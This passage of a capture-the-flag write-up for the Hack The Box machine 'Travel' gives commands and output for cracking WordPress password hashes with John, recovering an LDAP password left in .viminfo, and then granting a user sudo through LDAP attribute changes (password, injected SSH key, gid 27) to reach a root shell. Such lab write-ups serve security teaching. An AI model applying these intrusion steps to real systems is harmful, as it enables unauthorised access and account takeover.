+/<span class="k">*</span><span class="o">!</span>40000 ALTER TABLE <span class="sb">`</span>wp_users<span class="sb">`</span> DISABLE KEYS <span class="k">*</span>/<span class="p">;</span>
+INSERT INTO <span class="sb">`</span>wp_users<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">'admin'</span>,<span class="s1">'$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/'</span>,<span class="s1">'admin'</span>,<span class="s1">'admin@travel.htb'</span>,<span class="s1">'http://localhost'</span>,<span class="s1">'2020-04-13 13:19:01'</span>,<span class="s1">''</span>,0,<span class="s1">'admin'</span><span class="o">)</span>,<span class="o">(</span>2,<span class="s1">'lynik-admin'</span>,<span class="s1">'$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.'</span>,<span class="s1">'lynik-admin'</span>,<span class="s1">'lynik@travel.htb'</span>,<span class="s1">''</span>,<span class="s1">'2020-04-13 13:36:18'</span>,<span class="s1">''</span>,0,<span class="s1">'Lynik Schmidt'</span><span class="o">)</span><span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40000 ALTER TABLE <span class="sb">`</span>wp_users<span class="sb">`</span> ENABLE KEYS <span class="k">*</span>/<span class="p">;</span>
+UNLOCK TABLES<span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40103 SET <span class="nv">TIME_ZONE</span><span class="o">=</span>@OLD_TIME_ZONE <span class="k">*</span>/<span class="p">;</span>
+
+/<span class="k">*</span><span class="o">!</span>40101 SET <span class="nv">SQL_MODE</span><span class="o">=</span>@OLD_SQL_MODE <span class="k">*</span>/<span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40014 SET <span class="nv">FOREIGN_KEY_CHECKS</span><span class="o">=</span>@OLD_FOREIGN_KEY_CHECKS <span class="k">*</span>/<span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40014 SET <span class="nv">UNIQUE_CHECKS</span><span class="o">=</span>@OLD_UNIQUE_CHECKS <span class="k">*</span>/<span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40101 SET <span class="nv">CHARACTER_SET_CLIENT</span><span class="o">=</span>@OLD_CHARACTER_SET_CLIENT <span class="k">*</span>/<span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40101 SET <span class="nv">CHARACTER_SET_RESULTS</span><span class="o">=</span>@OLD_CHARACTER_SET_RESULTS <span class="k">*</span>/<span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40101 SET <span class="nv">COLLATION_CONNECTION</span><span class="o">=</span>@OLD_COLLATION_CONNECTION <span class="k">*</span>/<span class="p">;</span>
+/<span class="k">*</span><span class="o">!</span>40111 SET <span class="nv">SQL_NOTES</span><span class="o">=</span>@OLD_SQL_NOTES <span class="k">*</span>/<span class="p">;</span>
+
+<span class="nt">--</span> Dump completed on 2020-04-13 13:39:31
+</pre></table></code></div></div><p>From the wp_users table, we found hashes for user <code class="language-plaintext highlighter-rouge">admin</code> &amp; <code class="language-plaintext highlighter-rouge">lynik-admin</code>, let’s crack them using John</p><h3 id="cracking-hashes">Cracking Hashes</h3><p>Using John we were able to crack the password hash of user <code class="language-plaintext highlighter-rouge">lynik-admin</code> as <code class="language-plaintext highlighter-rouge">1stepcloser</code>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ <span class="nb">cat </span>admin.hashes
+admin:<span class="nv">$P$BIRXVj</span>/ZG0YRiBH8gnRy0chBx67WuK/
+lynik-admin:<span class="nv">$P$B</span>/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.
+
+cfx:  ~/Documents/htb/travel
+→ john  admin.hashes  <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts <span class="o">(</span>phpass <span class="o">[</span>phpass <span class="o">(</span><span class="nv">$P$ </span>or <span class="nv">$H$)</span> 256/256 AVX2 8x3]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 8192 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+1stepcloser      <span class="o">(</span>lynik-admin<span class="o">)</span>
+1g 0:00:08:03 DONE <span class="o">(</span>2020-09-21 16:12<span class="o">)</span> 0.002068g/s 29667p/s 31179c/s 31179C/s <span class="o">!!!</span>@@@!!!..<span class="k">*</span>7¡Vamos!
+Use the <span class="s2">"--show --format=phpass"</span> options to display all of the cracked passwords reliably
+Session completed
+</pre></table></code></div></div><h3 id="ssh">SSH</h3><p>Now that we have the password for <code class="language-plaintext highlighter-rouge">lynik-admin</code> user, we can SSH into the machine and grab the user flag:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ ssh lynik-admin@10.10.10.189
+The authenticity of host <span class="s1">'10.10.10.189 (10.10.10.189)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:KSjh2mhuESUZQcaB1ewLHie9gTUCmvOlypvBpcyAF/w.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.189<span class="s1">' (ECDSA) to the list of known hosts.
+lynik-admin@10.10.10.189'</span>s password:
+Permission denied, please try again.
+lynik-admin@10.10.10.189<span class="s1">'s password:
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
+
+  System information as of Mon 21 Sep 2020 10:54:50 AM UTC
+
+  System load:                      0.0
+  Usage of /:                       46.2% of 15.68GB
+  Memory usage:                     12%
+  Swap usage:                       0%
+  Processes:                        201
+  Users logged in:                  0
+  IPv4 address for br-836575a2ebbb: 172.20.0.1
+  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.10.189
+
+lynik-admin@travel:~$ id
+uid=1001(lynik-admin) gid=1001(lynik-admin) groups=1001(lynik-admin)
+lynik-admin@travel:~$ ls
+user.txt
+lynik-admin@travel:~$ cat user.txt
+801d4e55fbd276b1****************
+
+</span></pre></table></code></div></div><h2 id="elevating-privilige-lynik-admin---root">Elevating privilige: lynik-admin -&gt; root</h2><h3 id="enumeration-1">Enumeration</h3><p>While checking out the home directory we discover some interesting files:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 36
+drwx------ 3 lynik-admin lynik-admin 4096 Apr 24 06:52 <span class="nb">.</span>
+drwxr-xr-x 4 root        root        4096 Apr 23 17:31 ..
+lrwxrwxrwx 1 lynik-admin lynik-admin    9 Apr 23 17:31 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 lynik-admin lynik-admin  220 Feb 25  2020 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 lynik-admin lynik-admin 3771 Feb 25  2020 .bashrc
+drwx------ 2 lynik-admin lynik-admin 4096 Apr 23 19:34 .cache
+<span class="nt">-rw-r--r--</span> 1 lynik-admin lynik-admin   82 Apr 23 19:35 .ldaprc
+<span class="nt">-rw-r--r--</span> 1 lynik-admin lynik-admin  807 Feb 25  2020 .profile
+<span class="nt">-r--r--r--</span> 1 root        root          33 Sep 20 13:59 user.txt
+<span class="nt">-rw-------</span> 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo
+</pre></table></code></div></div><p>Both <code class="language-plaintext highlighter-rouge">.ldaprc</code> and <code class="language-plaintext highlighter-rouge">.viminfo</code> are worth checking out.</p><p>First, lets look at <code class="language-plaintext highlighter-rouge">.ldaprc</code> which is the config file LDAP, here we find hostname as <code class="language-plaintext highlighter-rouge">ldap.travel.htb</code>, BASE and BINDN info required for connecting to LDAP:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> .ldaprc
+HOST ldap.travel.htb
+BASE <span class="nv">dc</span><span class="o">=</span>travel,dc<span class="o">=</span>htb
+BINDDN <span class="nv">cn</span><span class="o">=</span>lynik-admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+</pre></table></code></div></div><p>Next, we have <code class="language-plaintext highlighter-rouge">.viminfo</code> which usually stores history of deleted contents from files, so its worth checking:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> .viminfo
+<span class="c"># This viminfo file was generated by Vim 8.1.</span>
+<span class="c"># You may edit it if you're careful!</span>
+
+<span class="c"># Viminfo version</span>
+|1,4
+
+<span class="c"># Value of 'encoding' when this file was written</span>
+<span class="k">*</span><span class="nv">encoding</span><span class="o">=</span>utf-8
+
+
+<span class="c"># hlsearch on (H) or off (h):</span>
+~h
+<span class="c"># Command Line History (newest to oldest):</span>
+:wq!
+|2,0,1587670530,,<span class="s2">"wq!"</span>
+
+<span class="c"># Search String History (newest to oldest):</span>
+
+<span class="c"># Expression History (newest to oldest):</span>
+
+<span class="c"># Input Line History (newest to oldest):</span>
+
+<span class="c"># Debug Line History (newest to oldest):</span>
+
+<span class="c"># Registers:</span>
+<span class="s2">""</span>1     LINE    0
+        BINDPW Theroadlesstraveled
+|3,1,1,1,1,0,1587670528,<span class="s2">"BINDPW Theroadlesstraveled"</span>
+
+<span class="c"># File marks:</span>
+<span class="s1">'0  3  0  ~/.ldaprc
+|4,48,3,0,1587670530,"~/.ldaprc"
+
+# Jumplist (newest first):
+-'</span>  3  0  ~/.ldaprc
+|4,39,3,0,1587670530,<span class="s2">"~/.ldaprc"</span>
+-<span class="s1">'  1  0  ~/.ldaprc
+|4,39,1,0,1587670527,"~/.ldaprc"
+
+# History of marks within files (newest to oldest):
+
+&gt; ~/.ldaprc
+        *       1587670529      0
+        "       3       0
+        .       4       0
+        +       4       0
+</span></pre></table></code></div></div><p>One interesting info we found from this file is <code class="language-plaintext highlighter-rouge">"BINDPW Theroadlesstraveled"</code> which looks to be deleted from .ldaprc file. LDAP stores its password in BINDPW so we got the ldap password as <code class="language-plaintext highlighter-rouge">Theroadlesstraveled</code></p><h3 id="ldap-recon">LDAP Recon</h3><p>With the above discovered information, lets use <code class="language-plaintext highlighter-rouge">ldapsearch</code> to dump LDAP database, since <code class="language-plaintext highlighter-rouge">.ldaprc</code> config is already present in current working directory we don’t have to input <code class="language-plaintext highlighter-rouge">BASE</code> and <code class="language-plaintext highlighter-rouge">BINDDN</code> info in our ldapsearch command.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-w</span> Theroadlesstraveled
+<span class="c"># extended LDIF</span>
+<span class="c">#</span>
+<span class="c"># LDAPv3</span>
+<span class="c"># base &lt;dc=travel,dc=htb&gt; (default) with scope subtree</span>
+<span class="c"># filter: (objectclass=*)</span>
+<span class="c"># requesting: ALL</span>
+<span class="c">#</span>
+
+<span class="c"># travel.htb</span>
+dn: <span class="nv">dc</span><span class="o">=</span>travel,dc<span class="o">=</span>htb
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: Travel.HTB
+dc: travel
+
+<span class="o">[</span>..SNIP..]
+<span class="c"># lynik-admin, travel.htb</span>
+dn: <span class="nv">cn</span><span class="o">=</span>lynik-admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+description: LDAP administrator
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: lynik-admin
+userPassword:: <span class="nv">e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ</span><span class="o">==</span>
+<span class="c"># workstations, travel.htb</span>
+dn: <span class="nv">ou</span><span class="o">=</span>workstations,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+description: Workstations
+objectClass: organizationalUnit
+ou: workstations
+
+<span class="c"># linux, servers, travel.htb</span>
+dn: <span class="nv">ou</span><span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+description: Linux Servers
+objectClass: organizationalUnit
+ou: linux
+
+<span class="o">[</span>..SNIP..]
+
+<span class="c"># lynik, users, linux, servers, travel.htb</span>
+dn: <span class="nv">uid</span><span class="o">=</span>lynik,ou<span class="o">=</span><span class="nb">users</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+uid: lynik
+uidNumber: 5000
+homeDirectory: /home/lynik
+givenName: Lynik
+gidNumber: 5000
+sn: Schmidt
+cn: Lynik Schmidt
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
+
+<span class="c"># edward, users, linux, servers, travel.htb</span>
+dn: <span class="nv">uid</span><span class="o">=</span>edward,ou<span class="o">=</span><span class="nb">users</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+uid: edward
+uidNumber: 5009
+homeDirectory: /home/edward
+givenName: Edward
+gidNumber: 5000
+sn: Roberts
+cn: Edward Roberts
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
+
+<span class="o">[</span>..SNIP..]
+
+<span class="c"># domainusers, groups, linux, servers, travel.htb</span>
+dn: <span class="nv">cn</span><span class="o">=</span>domainusers,ou<span class="o">=</span><span class="nb">groups</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+memberUid: frank
+memberUid: brian
+memberUid: christopher
+memberUid: johnny
+memberUid: julia
+memberUid: jerry
+memberUid: louise
+memberUid: eugene
+memberUid: edward
+memberUid: gloria
+memberUid: lynik
+gidNumber: 5000
+cn: domainusers
+objectClass: top
+objectClass: posixGroup
+
+<span class="c"># search result</span>
+search: 2
+result: 0 Success
+
+<span class="c"># numResponses: 22</span>
+<span class="c"># numEntries: 21</span>
+</pre></table></code></div></div><h3 id="ldapsearch-output">Ldapsearch Output:</h3><ul><li>From ldapsearch output we discovered our user <code class="language-plaintext highlighter-rouge">lynik-admin</code> is the <code class="language-plaintext highlighter-rouge">LDAP administrator</code>, although the password hash is not that useful since we already know the password.<div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="c"># lynik-admin, travel.htb</span>
+dn: <span class="nv">cn</span><span class="o">=</span>lynik-admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+description: LDAP administrator
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: lynik-admin
+userPassword:: <span class="nv">e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ</span><span class="o">==</span>
+</pre></table></code></div></div></li><li>We also got multiple usernames residing on the box and their attributes like <code class="language-plaintext highlighter-rouge">uidNumber</code> and <code class="language-plaintext highlighter-rouge">gidNumber</code> which we can manipulate further to get our self root access.</li></ul><p>While looking at the groups which are presents on the box, I found the below one are most interesting which we could potentially use for escalating privileges:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> /etc/group
+root:x:0:
+<span class="nb">sudo</span>:x:27:trvl-admin
+dip:x:30:trvl-admin
+<span class="o">[</span>..SNIP..]
+plugdev:x:46:trvl-admin
+<span class="o">[</span>..SNIP..]
+lxd:x:116:trvl-admin
+trvl-admin:x:1000:
+lynik-admin:x:1001:
+docker:x:117:
+</pre></table></code></div></div><h3 id="modifying-user-attributes-via-ldap">Modifying User attributes via LDAP</h3><p>Since we are the LDAP administrator we can modify the user attributes in LDAP. We can do this manually by adding attributes value in an LDIF file and modify them using the <code class="language-plaintext highlighter-rouge">ldapmodify</code> or we can use <code class="language-plaintext highlighter-rouge">Apache Directory studio</code> tool available <a href="https://directory.apache.org/studio/download/download-linux.html"><strong>here</strong></a> which has a GUI interface minimizing the manual efforts of creating ldif file.</p><p>First let’s use <code class="language-plaintext highlighter-rouge">Apache Directory Studio</code> and later let’s also try <code class="language-plaintext highlighter-rouge">ldapmodify</code> with <code class="language-plaintext highlighter-rouge">ldif</code> file:</p><h3 id="ssh-port-forwarding">SSH Port forwarding</h3><p>For using <code class="language-plaintext highlighter-rouge">Apache Directory Studio</code> I need ldap connectivity on my machine, so let’s use <code class="language-plaintext highlighter-rouge">SSH local port forwarding</code> method so I can reach the LDAP server from my machine:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>lynik-admin@travel:~<span class="err">$</span>
+ssh&gt; <span class="nt">-L</span> 389:ldap.travel.htb:389
+Forwarding port.
+</pre></table></code></div></div><blockquote><p>Important Note - Since I am running as root user on my machine I have the privileges to use ports below 1024 for port forwarding, If I was running as low privileged user (ex. Parrot OS default user) on my machine I would have to use ports above 1024 for port forwarding or use SUDO command to run the SSH as root.</p></blockquote><p>Now that we have our port forwarding enabled, let’s test it out:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> <span class="s2">"localhost:389"</span> <span class="nt">-w</span> <span class="s2">"Theroadlesstraveled"</span> <span class="nt">-b</span> <span class="s2">"dc=travel,dc=htb"</span> <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span>
+<span class="c"># extended LDIF</span>
+<span class="c">#</span>
+<span class="c"># LDAPv3</span>
+<span class="c"># base &lt;dc=travel,dc=htb&gt; with scope subtree</span>
+<span class="c"># filter: (objectclass=*)</span>
+<span class="c"># requesting: ALL</span>
+<span class="c">#</span>
+
+<span class="c"># travel.htb</span>
+dn: <span class="nv">dc</span><span class="o">=</span>travel,dc<span class="o">=</span>htb
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: Travel.HTB
+dc: travel
+
+<span class="o">[</span>..SNIP..]
+
+objectClass: posixGroup
+
+<span class="c"># search result</span>
+search: 2
+result: 0 Success
+
+<span class="c"># numResponses: 22</span>
+<span class="c"># numEntries: 21</span>
+</pre></table></code></div></div><p>Great ! It working flawlessly as we can see the same output from ldapsearch running on our machine, here we have specified the host as <code class="language-plaintext highlighter-rouge">localhost:389</code> (our forwarded port) along with <code class="language-plaintext highlighter-rouge">-b</code> and <code class="language-plaintext highlighter-rouge">-D</code> flag for BASE and BINDDN config we saw in .ldaprc file.</p><p>Now that everything is configured let’s fire up <code class="language-plaintext highlighter-rouge">Apache Directory Studio</code></p><h3 id="apache-directory-studio">Apache Directory Studio</h3><p>Initial configuration for setting up an LDAP connection:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/ldap.png" alt="ldap" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/ldap1.png" alt="ldap1" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/ldap2.png" alt="ldap2" /></p><p>Now that we have our LDAP connection, lets modify the attributes of user <code class="language-plaintext highlighter-rouge">lynik</code>:</p><p>First, lets setup a password as <code class="language-plaintext highlighter-rouge">coldfusionx</code> by adding a new attribute <code class="language-plaintext highlighter-rouge">userPassword</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/user1.png" alt="user1" /></p><p>Next we add an SSH public key to the user, to do that first we create a new <code class="language-plaintext highlighter-rouge">objectClass</code> and add <code class="language-plaintext highlighter-rouge">ldapPublicKey</code> object class entry to it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/user2.png" alt="user2" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/user3.png" alt="user3" /></p><p>Let’s create a SSH key for user <code class="language-plaintext highlighter-rouge">lynik</code> add the <code class="language-plaintext highlighter-rouge">sshPublicKey</code> attribute and put our SSH key there:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ ssh-keygen  <span class="nt">-f</span> lynik
+Generating public/private rsa key pair.
+Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>:
+Enter same passphrase again:
+Your identification has been saved <span class="k">in </span>lynik
+Your public key has been saved <span class="k">in </span>lynik.pub
+The key fingerprint is:
+SHA256:reRQpOOPw5qeikSLSGo153XW4HOvGeft71yX2e2xvUk root@cfx
+The key<span class="s1">'s randomart image is:
++---[RSA 3072]----+
+|        .        |
+|       o         |
+|      o ..       |
+|     . o..o      |
+| o o .o.S=.o     |
+|* o +..*o.o .   =|
+|++   .+ +  . o E=|
+|o.   + .    * ooB|
+|. .o=      o ..BO|
++----[SHA256]-----+
+
+cfx:  ~/Documents/htb/travel
+→ cat lynik.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC+5sWeF3whJjAHQdFvQrxNBXYFhyEf05R40iTT5TxcJzBs0rmjxMjwDJ8GM24Gs417EDF+9Qj1Xo6NVexdBxOQzOW3NKJAcE2YF7ZAdmgxhmzUvVpxko7eFhT24dizWUHsaM7JqLMO+UdqpiO0Yepf40N9E70NCQmLExb+YJq4/xJo/zypJuOacNAaEw+yPpvhgcde1uVxFQth0q0x6LvkxUpjYvLv3v+f1pdg5z52/bHzDEV6T+OGtzRiSHxKILiDDZkgFvgD6Y1Mi3wmlWHwbkZxUha2XFKzlFOJS5xjjIPwjeh7RBqvsm9oIBVtG9rEXG8Pr73IBk3kU6ywsrB9esYaQ+XxomEXuJVlmhVWKSTJgDapHCymoZ4U1JQRffYfdHy2HFtnpBPzhuMKL4lLqs9kDw23K9oyrVSnb99/eWZkqH80tpWbeYh1JUaAHoIUkex43q3YUPhlkxdmKQRK+EXSxEw9N3j6S7i2l+/XIrJjeMSc6BaULnlatuA3Ms= root@cfx
+</span></pre></table></code></div></div><p>Adding the generated SSH public key to <code class="language-plaintext highlighter-rouge">sshPublicKey</code> attribute:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/key1.png" alt="key1" /></p><p>Finally, we will change the Group ID to 27 (sudo) so our user will be able to become root once we have a shell:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/gid.png" alt="gid" /></p><h2 id="root-shell">Root Shell</h2><p>Now we can SSH to the server as user <code class="language-plaintext highlighter-rouge">lynik</code> specifying the RSA key:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ ssh <span class="nt">-i</span> lynik lynik@10.10.10.189
+Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-26-generic x86_64<span class="o">)</span>
+
+  System information as of Mon 21 Sep 2020 01:22:05 PM UTC
+
+  System load:                      0.01
+  Usage of /:                       46.2% of 15.68GB
+  Memory usage:                     12%
+  Swap usage:                       0%
+  Processes:                        206
+  Users logged <span class="k">in</span>:                  1
+  IPv4 address <span class="k">for </span>br-836575a2ebbb: 172.20.0.1
+  IPv4 address <span class="k">for </span>br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address <span class="k">for </span>docker0:         172.17.0.1
+  IPv4 address <span class="k">for </span>eth0:            10.10.10.189
+
+Last login: Mon Sep 21 13:20:39 2020 from 10.10.14.11
+To run a <span class="nb">command </span>as administrator <span class="o">(</span>user <span class="s2">"root"</span><span class="o">)</span>, use <span class="s2">"sudo &lt;command&gt;"</span><span class="nb">.</span>
+See <span class="s2">"man sudo_root"</span> <span class="k">for </span>details.
+
+lynik@travel:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>5000<span class="o">(</span>lynik<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,5000<span class="o">(</span>domainusers<span class="o">)</span>
+</pre></table></code></div></div><p>The gid is 27 and we are a member of sudo group, Next we will run <code class="language-plaintext highlighter-rouge">sudo -l</code> and input the password as <code class="language-plaintext highlighter-rouge">coldfusionx</code> which confirms we are root.</p><p>Finally we will run <code class="language-plaintext highlighter-rouge">sudo su -</code> to pop the root shell and grab the root flag.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>lynik@travel:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>lynik:
+Matching Defaults entries <span class="k">for </span>lynik on travel:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User lynik may run the following commands on travel:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+lynik@travel:~<span class="nv">$ </span><span class="nb">sudo </span>su -
+root@travel:~# <span class="nb">ls
+</span>bin  root.txt  snap
+root@travel:~# <span class="nb">cat </span>root.txt
+5bca37c220d7bd62<span class="k">****************</span>
+
